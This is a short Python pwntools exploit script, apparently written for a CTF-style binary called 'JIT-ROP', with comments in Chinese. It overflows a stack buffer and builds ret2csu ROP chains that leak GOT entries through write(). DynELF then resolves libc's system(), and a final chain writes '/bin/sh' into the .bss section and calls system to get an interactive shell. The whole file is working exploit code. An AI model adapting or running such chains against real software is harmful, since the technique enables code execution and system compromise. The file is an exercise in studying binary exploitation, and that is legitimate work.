from pwn import *

# 设置日志级别为debug
# context.log_level = 'debug'

elf = ELF('./JIT-ROP')

plt_write = elf.symbols['write']
got_write = elf.got['write']

got_read = elf.got['read']

#vulfun_addr = 0x0000000000400630
main_func = 0x4007cd
vulfun_addr = main_func

# gadget_p4
'''
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''
gadget_p4 = 0x000000000040089c
bss_addr = 0x0000000000601070

pad = b'a' * 24  # 将字符串转换为字节串

def leak(address):
    payload = b'a' * 24  # 字节串
    payload += p64(0x40089C) + p64(0x40089A) + p64(0) + p64(1)
    payload += p64(got_write) + p64(1024) + p64(address) + p64(1)
    payload += p64(0x400880) + b"\x00" * 56 + p64(0x4007cd)
    p.send(payload)

    data = p.recv(1024)
    print(f"{address:#x} => {data.hex() if data else ''}")
    whatrecv = p.recv(43)
    print('whatrecv = :', whatrecv)
    
    return data

p = process('./JIT-ROP')

start = p.recvuntil(b'\n')  # 接收直到换行符
print('start:', start)

d = DynELF(leak, elf=ELF('./JIT-ROP'))
system_addr = d.lookup('system', 'libc')
print(f"system_addr={hex(system_addr)}")

payload = b"a" * 24  # 字节串
payload += p64(0x40089C) + p64(0x40089A) + p64(0) + p64(1)
payload += p64(got_read) + p64(8) + p64(0x601000) + p64(0)
payload += p64(0x400880) + b"\x00" * 56 + p64(0x4008a3)
payload += p64(0x601000) + p64(system_addr)
p.send(payload)
p.send(b"/bin/sh\x00")  # 字节串

p.interactive()

